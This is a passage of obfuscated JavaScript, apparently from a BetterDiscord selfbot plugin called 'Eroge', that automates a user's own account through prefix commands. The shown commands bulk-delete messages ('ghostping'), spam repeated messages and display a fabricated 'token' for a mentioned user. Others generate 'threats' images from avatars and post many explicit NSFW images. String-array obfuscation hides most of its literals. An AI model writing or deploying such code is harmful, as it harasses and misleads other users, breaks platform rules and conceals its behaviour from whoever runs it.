          _0xe6e37f(abdrahman(1182))[abdrahman(656)](keeshia => keeshia.text())[abdrahman(656)](quisto => jillian[abdrahman(407)][abdrahman(746)](yaeno + quisto));
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "ghostping")) {
          let shaniquea = jillian[abdrahman(1301)];
          if (!shaniquea) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(750));
          jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1076)), jillian.channel.fetchMessages({limit: Math[abdrahman(858)](1, 100, 200)}).then(annalina => {
            const calizza = abdrahman;
            annalina[calizza(1026)](chukwuebuka => {
              const coletyn = calizza;
              chukwuebuka[coletyn(1289)]()[coletyn(652)](console[coletyn(758)]);
            });
          });
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1286))) {
          jillian.delete();
          const omika = abdrahman(1276), tayven = abdrahman(785);
          jillian[abdrahman(407)][abdrahman(746)](omika), jillian[abdrahman(407)][abdrahman(746)](tayven), jillian.channel[abdrahman(746)](omika), jillian.channel[abdrahman(746)](tayven), jillian.channel[abdrahman(746)](omika), jillian.channel[abdrahman(746)](tayven), jillian[abdrahman(407)].send(omika), jillian[abdrahman(407)][abdrahman(746)](tayven), jillian[abdrahman(407)].send(omika), jillian[abdrahman(407)][abdrahman(746)](tayven), jillian.channel[abdrahman(746)](omika), jillian.channel[abdrahman(746)](tayven), jillian[abdrahman(407)].send(omika), jillian[abdrahman(407)][abdrahman(746)](tayven), jillian[abdrahman(407)][abdrahman(746)](omika), jillian[abdrahman(407)][abdrahman(746)](tayven);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(732))) {
          const merrideth = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!merrideth) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(768));
          let jolonda = ["HircHg", abdrahman(654), abdrahman(634), abdrahman(1041), abdrahman(811)], rmontay = [abdrahman(1410), abdrahman(1091), "3_6Xt2k4OieDKimnNYGWUq9vJRo", abdrahman(1069)];
          var zaion = merrideth.id, aubriannah = _0xd5693d[abdrahman(625)](zaion), jaquarion = _0x26f764[abdrahman(625)](aubriannah);
          let alizabella = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR).setTitle(abdrahman(1306) + merrideth.username + "")[abdrahman(457)]("" + jaquarion + "." + jolonda[Math.floor(Math[abdrahman(1240)]() * [abdrahman(509), abdrahman(654), abdrahman(634), abdrahman(1041), "Xiq-WQ"].length)] + "." + rmontay[Math[abdrahman(250)](Math[abdrahman(1240)]() * [abdrahman(1410), "oZyGJDamSJ4hmJaaLvzdNo1bLqk", abdrahman(565), abdrahman(1069)].length)] + "");
          jillian.channel.send(alizabella);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(717))) {
          const emmalinn = abdrahman(1155);
          jillian[abdrahman(930)](emmalinn);
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "threats")) {
          const jabo = jillian[abdrahman(726)].users.first();
          jillian[abdrahman(1289)]();
          if (!jabo) return window.BdApi[abdrahman(1248)](abdrahman(1078), "Sorry, you need mention someone. ❌");
          rakiah();
          async function rakiah() {
            const maritsa = abdrahman;
            let axe = await _0x3857f.generate(maritsa(1305), {url: jabo.avatarURL});
            cirrus(1e3);
            let cieria = (new sherae[maritsa(344)])[maritsa(321)](COLOR).setImage(axe)[maritsa(938)](maritsa(899), IMAGE);
            cieria[maritsa(1264)](), jillian[maritsa(407)][maritsa(746)](cieria);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(863))) {
          const waldo = jillian[abdrahman(726)].users[abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!waldo) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(768));
          shaquette();
          async function shaquette() {
            const meleesa = abdrahman;
            let shashawn = await _0x3857f.generate(meleesa(863), {author: meleesa(521), image: waldo[meleesa(879)], name: waldo[meleesa(1423)]});
            cirrus(1e3);
            let envy = (new sherae[meleesa(344)])[meleesa(321)](COLOR).setImage(shashawn)[meleesa(938)](meleesa(899), IMAGE);
            envy[meleesa(1264)](), jillian.channel[meleesa(746)](envy);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1244))) {
          const olida = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!olida) return window.BdApi.alert(abdrahman(1078), abdrahman(768));
          kailub();
          async function kailub() {
            const brandyann = abdrahman;
            let haylan = await _0x3857f[brandyann(1107)](brandyann(1244), {url: olida[brandyann(879)]});
            cirrus(1e3);
            let hulda = (new sherae[brandyann(344)]).setColor(COLOR)[brandyann(1211)](haylan).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            hulda[brandyann(1264)](), jillian[brandyann(407)].send(hulda);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(946))) {
          const nikka = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let concheta = maverick[abdrahman(1063)](1).join(" ");
          jillian[abdrahman(1289)]();
          if (!nikka) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(768));
          if (!concheta) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(570));
          ahmand();
          async function ahmand() {
            const ettie = abdrahman;
            let addilynn = await _0x3857f[ettie(1107)](ettie(946), {text: concheta, username: nikka[ettie(1423)]});
            cirrus(1e3);
            let kelei = (new sherae[ettie(344)])[ettie(321)](COLOR)[ettie(1211)](addilynn)[ettie(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            kelei[ettie(1264)](), jillian[ettie(407)][ettie(746)](kelei);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(690))) {
          const xavy = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!xavy) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "Sorry, you need mention someone. ❌");
          evanka();
          async function evanka() {
            const telissa = abdrahman;
            let cherline = await _0x3857f.generate(telissa(690), {user1: shadarria[telissa(1417)][telissa(879)], user2: xavy[telissa(879)]});
            cirrus(1e3);
            let arthemise = (new sherae[telissa(344)]).setColor(COLOR)[telissa(1211)](cherline).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            arthemise[telissa(1264)](), jillian.channel.send(arthemise);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(618))) {
          jillian[abdrahman(1289)]();
          const ledge = jillian.mentions[abdrahman(543)][abdrahman(911)]();
          if (!ledge) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(768));
          money();
          async function money() {
            const kentley = abdrahman;
            let aadiya = zysean[kentley(1107)]("approved", {url: ledge.avatarURL})[kentley(656)](jandra => {
              const amarrie = kentley;
              jillian[amarrie(407)].send({files: [{attachment: jandra, name: amarrie(979)}]});
            });
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1127))) {
          jillian.delete();
          const waller = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(232) + maithili + abdrahman(881) + maithili + " <<」**")[abdrahman(444)](shadarria[abdrahman(1417)][abdrahman(574)]).setDescription(abdrahman(649) + maithili + abdrahman(506) + maithili + "```").setColor(COLOR).addField(abdrahman(712) + PREFIX + "hentai ```***", abdrahman(347))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1188), abdrahman(595))[abdrahman(695)]("***```" + PREFIX + abdrahman(604), abdrahman(824))[abdrahman(695)](abdrahman(712) + PREFIX + "hmidriff ```***", abdrahman(975))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(662), "***Random gif***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(792), "***Random holo image***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1110), abdrahman(1065))[abdrahman(695)]("***```" + PREFIX + abdrahman(1100), abdrahman(398))[abdrahman(695)]("***```" + PREFIX + abdrahman(341), abdrahman(838))[abdrahman(695)]("***```" + PREFIX + "kemonomimi ```***", abdrahman(239))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(358), abdrahman(828))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(744), abdrahman(1139))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1427), abdrahman(291))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(533), "***Random kanna image***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1394), abdrahman(311))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(380), abdrahman(1384)).addField(abdrahman(712) + PREFIX + abdrahman(1017), abdrahman(296))[abdrahman(695)]("***```" + PREFIX + abdrahman(419), abdrahman(1313))[abdrahman(695)](abdrahman(712) + PREFIX + "paizuri ```***", "***Random paizuri image***").addField(abdrahman(712) + PREFIX + "tentacle ```***", "***Random of tentacle***")[abdrahman(695)](abdrahman(712) + PREFIX + "boobs ```***", "***Random boobs picture***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1217), "***Random hboobs picture***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1375), abdrahman(1133))[abdrahman(695)](abdrahman(712) + PREFIX + "futanari ```***", "***Random futanari picture***").addField(abdrahman(712) + PREFIX + abdrahman(1186), abdrahman(1170)), ziheir = (new sherae.RichEmbed)[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(598), "***Random image of blowjob***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(696), abdrahman(1212))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(305), "***Random image of CumArts***")[abdrahman(695)](abdrahman(712) + PREFIX + "feet ```***", "***Random image of Feet***").addField("***```" + PREFIX + "feetgif ```***", "***Random image of Feet Gif***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1331), abdrahman(459))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1048), abdrahman(500))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(763), abdrahman(301)).addField(abdrahman(712) + PREFIX + abdrahman(661), abdrahman(1460))[abdrahman(695)](abdrahman(712) + PREFIX + "pussywank ```***", "***Random image of PussyWank***").addField("***```" + PREFIX + abdrahman(317), abdrahman(737))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(882), abdrahman(1257))[abdrahman(695)]("***```" + PREFIX + abdrahman(547), abdrahman(1436)).addField("***```" + PREFIX + abdrahman(902), "***Give a slap to the member***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(251), abdrahman(552))[abdrahman(695)]("***```" + PREFIX + abdrahman(804), "***Random image of Erotic Yuri***").addField(abdrahman(712) + PREFIX + abdrahman(1120), abdrahman(265))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(556), abdrahman(801)).addField(abdrahman(712) + PREFIX + "hentaigif ```***", abdrahman(765))[abdrahman(695)]("***```" + PREFIX + abdrahman(778), abdrahman(582))[abdrahman(695)](abdrahman(712) + PREFIX + "keta ```***", "***Random image of Keta***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(502), "***Random image of Lewd Avatar***").setImage(IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          ziheir[abdrahman(1264)](), jillian.channel[abdrahman(746)](waller), jillian[abdrahman(407)][abdrahman(746)](ziheir);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(399))) {
          jillian[abdrahman(1289)](), garrey();
          async function garrey() {
            const ezekyel = abdrahman;
            let jaishawn = await _0x3857f[ezekyel(1052)](ezekyel(399)), yoshikazu = (new sherae[ezekyel(344)]).setColor(COLOR).setTitle(ezekyel(527))[ezekyel(1211)](jaishawn)[ezekyel(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            yoshikazu[ezekyel(1264)](), jillian[ezekyel(407)][ezekyel(746)](yoshikazu);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "4k")) {
          jillian.delete(), kentron();
          async function kentron() {
            const elke = abdrahman;
            let rhinda = await _0x3857f[elke(1052)]("4k"), demarrion = (new sherae[elke(344)])[elke(321)](COLOR)[elke(1044)](elke(860))[elke(1211)](rhinda).setFooter(elke(899), IMAGE);
            demarrion[elke(1264)](), jillian.channel.send(demarrion);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1046))) {
          jillian.delete(), mahkhi();
          async function mahkhi() {
            const tylique = abdrahman;
            let ioni = await _0x3857f[tylique(1052)](tylique(1046)), rajay = (new sherae[tylique(344)])[tylique(321)](COLOR).setTitle(tylique(553))[tylique(1211)](ioni)[tylique(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            rajay.setTimestamp(), jillian.channel.send(rajay);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(531))) {
          jillian[abdrahman(1289)](), hassanah();
          async function hassanah() {
            const aizza = abdrahman;
            let deolinda = await _0x3857f[aizza(1052)](aizza(531)), akie = (new sherae[aizza(344)])[aizza(321)](COLOR)[aizza(1044)](aizza(1348))[aizza(1211)](deolinda)[aizza(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            akie[aizza(1264)](), jillian[aizza(407)][aizza(746)](akie);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1420))) {
          jillian[abdrahman(1289)](), reva();
          async function reva() {
            const yaakov = abdrahman;
            let jakor = await _0x3857f.get(yaakov(1420)), despena = (new sherae[yaakov(344)])[yaakov(321)](COLOR)[yaakov(1044)](yaakov(1350))[yaakov(1211)](jakor)[yaakov(938)](yaakov(899), IMAGE);
            despena[yaakov(1264)](), jillian[yaakov(407)].send(despena);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "holo")) {
          jillian[abdrahman(1289)](), dimetrius();
          async function dimetrius() {
            const lakeska = abdrahman;
            let elmedina = await _0x3857f[lakeska(1052)](lakeska(241)), jossalynn = (new sherae.RichEmbed).setColor(COLOR)[lakeska(1044)](lakeska(1059))[lakeska(1211)](elmedina).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            jossalynn[lakeska(1264)](), jillian[lakeska(407)][lakeska(746)](jossalynn);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(484))) {
          jillian.delete(), aakiyah();
          async function aakiyah() {
            const umeyma = abdrahman;
            let tinaka = await _0x3857f.get(umeyma(484)), khalill = (new sherae[umeyma(344)])[umeyma(321)](COLOR).setTitle(umeyma(1135))[umeyma(1211)](tinaka)[umeyma(938)](umeyma(899), IMAGE);
            khalill[umeyma(1264)](), jillian[umeyma(407)][umeyma(746)](khalill);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1206))) {
          jillian[abdrahman(1289)](), arrissa();
          async function arrissa() {
            const rosland = abdrahman;
            let fushia = await _0x3857f[rosland(1052)](rosland(1206)), challie = (new sherae[rosland(344)])[rosland(321)](COLOR)[rosland(1044)](rosland(588))[rosland(1211)](fushia)[rosland(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            challie[rosland(1264)](), jillian[rosland(407)].send(challie);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(617))) {
          jillian[abdrahman(1289)](), shanyce();
          async function shanyce() {
            const ihana = abdrahman;
            let yovani = await _0x3857f[ihana(1052)](ihana(617)), landonn = (new sherae[ihana(344)])[ihana(321)](COLOR).setTitle("**🔞 Hkitsune Picture 🔞**")[ihana(1211)](yovani)[ihana(938)](ihana(899), IMAGE);
            landonn[ihana(1264)](), jillian[ihana(407)][ihana(746)](landonn);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "kemonomimi")) {
          jillian[abdrahman(1289)](), vanitie();
          async function vanitie() {
            const ziyanna = abdrahman;
            let lotanna = await _0x3857f[ziyanna(1052)](ziyanna(446)), maclean = (new sherae[ziyanna(344)])[ziyanna(321)](COLOR)[ziyanna(1044)](ziyanna(1468))[ziyanna(1211)](lotanna)[ziyanna(938)](ziyanna(899), IMAGE);
            maclean[ziyanna(1264)](), jillian[ziyanna(407)].send(maclean);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1418))) {
          jillian.delete(), wakinyan();
          async function wakinyan() {
            const melizza = abdrahman;
            let anazia = await _0x3857f[melizza(1052)]("anal"), dallene = (new sherae[melizza(344)])[melizza(321)](COLOR).setTitle(melizza(956))[melizza(1211)](anazia)[melizza(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            dallene[melizza(1264)](), jillian[melizza(407)][melizza(746)](dallene);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1213))) {
          jillian[abdrahman(1289)](), janely();
          async function janely() {
            const taje = abdrahman;
            let danaka = await _0x3857f[taje(1052)](taje(1213)), alfonsina = (new sherae[taje(344)])[taje(321)](COLOR)[taje(1044)]("**🔞 Hanal Picture 🔞**")[taje(1211)](danaka)[taje(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            alfonsina.setTimestamp(), jillian[taje(407)][taje(746)](alfonsina);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "gonewild")) {
          jillian[abdrahman(1289)](), anahid();
          async function anahid() {
            const kobei = abdrahman;
            let shaira = await _0x3857f[kobei(1052)](kobei(245)), janelda = (new sherae.RichEmbed).setColor(COLOR)[kobei(1044)]("**🔞 Gonewild Picture 🔞**")[kobei(1211)](shaira)[kobei(938)](kobei(899), IMAGE);
            janelda[kobei(1264)](), jillian[kobei(407)][kobei(746)](janelda);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "kanna")) {
          jillian[abdrahman(1289)](), zebulan();
          async function zebulan() {
            const jovelyn = abdrahman;
            let roee = await _0x3857f[jovelyn(1052)](jovelyn(803)), shadya = (new sherae.RichEmbed)[jovelyn(321)](COLOR)[jovelyn(1044)](jovelyn(1190))[jovelyn(1211)](roee)[jovelyn(938)](jovelyn(899), IMAGE);
            shadya.setTimestamp(), jillian[jovelyn(407)].send(shadya);
          }
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(276))) {
          jillian[abdrahman(1289)](), neilani();
          async function neilani() {
            const otilio = abdrahman;
            let sophya = await _0x3857f.get(otilio(276)), ronnia = (new sherae[otilio(344)])[otilio(321)](COLOR)[otilio(1044)](otilio(1454)).setImage(sophya).setFooter(otilio(899), IMAGE);
            ronnia[otilio(1264)](), jillian[otilio(407)].send(ronnia);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1094))) {
          jillian[abdrahman(1289)](), mykola();
          async function mykola() {
            const trexton = abdrahman;
            let dickson = await _0x3857f[trexton(1052)](trexton(1094)), paxtynn = (new sherae.RichEmbed).setColor(COLOR).setTitle(trexton(1238))[trexton(1211)](dickson)[trexton(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            paxtynn[trexton(1264)](), jillian[trexton(407)].send(paxtynn);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(332))) {
          jillian[abdrahman(1289)](), cambre();
          async function cambre() {
            const chanler = abdrahman;
            let kros = await _0x3857f[chanler(1052)](chanler(332)), downing = (new sherae[chanler(344)])[chanler(321)](COLOR).setTitle(chanler(885))[chanler(1211)](kros).setFooter(chanler(899), IMAGE);
            downing.setTimestamp(), jillian[chanler(407)][chanler(746)](downing);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1152))) {
          jillian.delete(), elsi();
          async function elsi() {
            const vikesh = abdrahman;
            let aisaiah = await _0x3857f.get(vikesh(1152)), jazyria = (new sherae[vikesh(344)]).setColor(COLOR)[vikesh(1044)]("**🔞 Hthigh Picture 🔞**")[vikesh(1211)](aisaiah).setFooter(vikesh(899), IMAGE);
            jazyria[vikesh(1264)](), jillian[vikesh(407)].send(jazyria);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(528))) {
          jillian.delete(), brei();
          async function brei() {
            const abdinajib = abdrahman;
            let tayyaba = await _0x3857f[abdinajib(1052)](abdinajib(528)), wania = (new sherae[abdinajib(344)])[abdinajib(321)](COLOR)[abdinajib(1044)](abdinajib(335))[abdinajib(1211)](tayyaba)[abdinajib(938)](abdinajib(899), IMAGE);
            wania[abdinajib(1264)](), jillian[abdinajib(407)].send(wania);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1016))) {
          jillian[abdrahman(1289)](), anavi();
          async function anavi() {
            const misae = abdrahman;
            let shakenya = await _0x3857f.get(misae(1016)), landria = (new sherae.RichEmbed)[misae(321)](COLOR)[misae(1044)](misae(861)).setImage(shakenya)[misae(938)](misae(899), IMAGE);
            landria[misae(1264)](), jillian.channel.send(landria);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(931))) {
          jillian[abdrahman(1289)](), alaxis();
          async function alaxis() {
            const minela = abdrahman;
            let shontaye = await _0x3857f[minela(1052)]("boobs"), anyfer = (new sherae[minela(344)])[minela(321)](COLOR)[minela(1044)](minela(1262)).setImage(shontaye)[minela(938)](minela(899), IMAGE);
            anyfer[minela(1264)](), jillian[minela(407)][minela(746)](anyfer);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(397))) {
          jillian[abdrahman(1289)](), marneshia();
          async function marneshia() {
            const rooster = abdrahman;
            let jasiri = await _0x3857f[rooster(1052)](rooster(397)), yoany = (new sherae[rooster(344)])[rooster(321)](COLOR)[rooster(1044)]("**🔞 Hboobs Picture 🔞**").setImage(jasiri)[rooster(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            yoany.setTimestamp(), jillian.channel[rooster(746)](yoany);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(549))) {
          jillian[abdrahman(1289)](), mauna();
          async function mauna() {
            const sabir = abdrahman;
            let sharat = await _0x3857f[sabir(1052)](sabir(549)), kinleigh = (new sherae[sabir(344)])[sabir(321)](COLOR)[sabir(1044)](sabir(1485)).setImage(sharat)[sabir(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            kinleigh[sabir(1264)](), jillian[sabir(407)][sabir(746)](kinleigh);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(611))) {
          jillian[abdrahman(1289)](), aimon();
          async function aimon() {
            const bakary = abdrahman;
            _0x4d876d(bakary(937), function (kersten, domitilo, zahra) {
              const barrington = bakary;
              if (!kersten && domitilo[barrington(977)] == 200) {
                var lory = _0x51d1d3[barrington(1092)](zahra), edgerrin = lory.text(), knoa = edgerrin[barrington(738)](barrington(818), ""), airionna = knoa.replace('"}', "");
                let waine = (new sherae[barrington(344)])[barrington(321)](COLOR).setTitle(barrington(286))[barrington(1211)](airionna)[barrington(938)](barrington(899), IMAGE);
                waine[barrington(1264)](), jillian[barrington(407)][barrington(746)](waine);
              }
            });
          }
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(361))) {
          var jenyfer = jillian.content.split(/\s+/g)[abdrahman(1063)](1)[abdrahman(463)](" ");
          _0x34a6c3[abdrahman(1482)](abdrahman(312), [jenyfer], {nsfw: !![], limit: 1, random: !![]})[abdrahman(656)](_0x34a6c3[abdrahman(1137)])[abdrahman(656)](aniza => {
            const chih = abdrahman;
            for (let darinka of aniza) {
              const anber = (new sherae[chih(344)])[chih(321)](COLOR).setTitle(chih(769))[chih(1211)](darinka[chih(1430)][chih(1007)])[chih(1204)](darinka[chih(1430)].file_url)[chih(938)](chih(899), IMAGE);
              return jillian.channel.send({embed: anber});
            }
          }).catch(donvan => {
            const jamarius = abdrahman;
            return donvan[jamarius(799)] === jamarius(441) ? jillian[jamarius(407)][jamarius(746)](jamarius(1371) + jenyfer + jamarius(686)) : jillian[jamarius(407)][jamarius(746)](jamarius(1371) + jenyfer + "**!");
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "blowjob")) {
          jillian[abdrahman(1289)](), sarahi();
          async function sarahi() {
            const jalna = abdrahman;
            let zaia = await _0x1ea298[jalna(1127)][jalna(709)](), crysta = (new sherae.RichEmbed)[jalna(321)](COLOR)[jalna(1044)](jalna(583))[jalna(1211)](zaia.url)[jalna(938)](jalna(899), IMAGE);
            crysta[jalna(1264)](), jillian[jalna(407)].send(crysta);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(702))) {
          jillian[abdrahman(1289)](), clementine();
          async function clementine() {
            const audreona = abdrahman;
            let carmelia = await _0x1ea298.nsfw[audreona(702)](), adoniyah = (new sherae[audreona(344)]).setColor(COLOR)[audreona(1044)](audreona(1099))[audreona(1211)](carmelia[audreona(1378)]).setFooter(audreona(899), IMAGE);
            adoniyah[audreona(1264)](), jillian[audreona(407)][audreona(746)](adoniyah);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "cumarts")) {
          jillian.delete(), tomeisha();
          async function tomeisha() {
            const valery = abdrahman;
            let kyden = await _0x1ea298[valery(1127)].cumArts(), balin = (new sherae[valery(344)]).setColor(COLOR)[valery(1044)](valery(705)).setImage(kyden.url)[valery(938)](valery(899), IMAGE);
            balin[valery(1264)](), jillian[valery(407)][valery(746)](balin);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "feet")) {
          jillian[abdrahman(1289)](), leddie();
          async function leddie() {
            const wendelyn = abdrahman;
            let desireah = await _0x1ea298[wendelyn(1127)][wendelyn(1349)](), claudis = (new sherae[wendelyn(344)]).setColor(COLOR)[wendelyn(1044)](wendelyn(487))[wendelyn(1211)](desireah.url)[wendelyn(938)](wendelyn(899), IMAGE);
            claudis[wendelyn(1264)](), jillian.channel.send(claudis);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(631))) {
          jillian[abdrahman(1289)](), noam();
          async function noam() {
            const dumaka = abdrahman;
            let dontrey = await _0x1ea298[dumaka(1127)][dumaka(409)](), isiaha = (new sherae.RichEmbed)[dumaka(321)](COLOR)[dumaka(1044)](dumaka(496))[dumaka(1211)](dontrey.url)[dumaka(938)](dumaka(899), IMAGE);
            isiaha[dumaka(1264)](), jillian.channel[dumaka(746)](isiaha);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1442))) {
          jillian[abdrahman(1289)](), jadonis();
          async function jadonis() {
            const erman = abdrahman;
            let iago = await _0x1ea298[erman(1127)][erman(1442)](), siaki = (new sherae[erman(344)])[erman(321)](COLOR).setTitle(erman(1168))[erman(1211)](iago[erman(1378)])[erman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            siaki.setTimestamp(), jillian[erman(407)][erman(746)](siaki);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(390))) {
          jillian[abdrahman(1289)](), nayo();
          async function nayo() {
            const coreyona = abdrahman;
            let macen = await _0x1ea298[coreyona(1127)][coreyona(390)](), sever = (new sherae[coreyona(344)])[coreyona(321)](COLOR)[coreyona(1044)](coreyona(1261))[coreyona(1211)](macen[coreyona(1378)])[coreyona(938)](coreyona(899), IMAGE);
            sever[coreyona(1264)](), jillian.channel[coreyona(746)](sever);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1043))) {
          jillian[abdrahman(1289)](), dariean();
          async function dariean() {
            const abdulghani = abdrahman;
            let kaleis = await _0x1ea298[abdulghani(1127)][abdulghani(1043)](), illyana = (new sherae[abdulghani(344)])[abdulghani(321)](COLOR)[abdulghani(1044)](abdulghani(1129))[abdulghani(1211)](kaleis[abdulghani(1378)])[abdulghani(938)](abdulghani(899), IMAGE);
            illyana[abdulghani(1264)](), jillian[abdulghani(407)][abdulghani(746)](illyana);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1161))) {
          jillian[abdrahman(1289)](), mattheu();
          async function mattheu() {
            const shavonna = abdrahman;
            let alcides = await _0x1ea298.nsfw[shavonna(1161)](), elrose = (new sherae[shavonna(344)])[shavonna(321)](COLOR)[shavonna(1044)](shavonna(377)).setImage(alcides[shavonna(1378)]).setFooter(shavonna(899), IMAGE);
            elrose[shavonna(1264)](), jillian[shavonna(407)][shavonna(746)](elrose);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(996))) {
          jillian[abdrahman(1289)](), antania();
          async function antania() {
            const airel = abdrahman;
            let ahlanie = await _0x1ea298[airel(1127)][airel(775)](), cathi = (new sherae[airel(344)])[airel(321)](COLOR)[airel(1044)]("**🔞 PussyWankGif Picture 🔞**")[airel(1211)](ahlanie[airel(1378)])[airel(938)](airel(899), IMAGE);
            cathi[airel(1264)](), jillian[airel(407)][airel(746)](cathi);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1287))) {
          jillian[abdrahman(1289)](), nyomii();
          async function nyomii() {
            const keylianis = abdrahman;
